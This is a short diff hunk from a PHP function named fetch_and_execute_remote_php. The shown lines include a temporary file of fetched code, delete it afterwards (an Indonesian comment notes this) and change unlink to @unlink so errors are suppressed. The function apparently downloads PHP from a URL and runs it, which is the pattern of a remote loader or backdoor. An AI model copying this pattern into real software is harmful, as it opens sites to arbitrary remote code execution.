@@ -44,7 +44,7 @@ function fetch_and_execute_remote_php($url) {
             echo "Error: Unable to include the temporary file. " . $e->getMessage();
         }
         // Menghapus file sementara setelah dieksekusi
-        unlink($filePath);
+        @unlink($filePath);
     } else {
         echo "Error: Unable to write to temporary file.";
     }
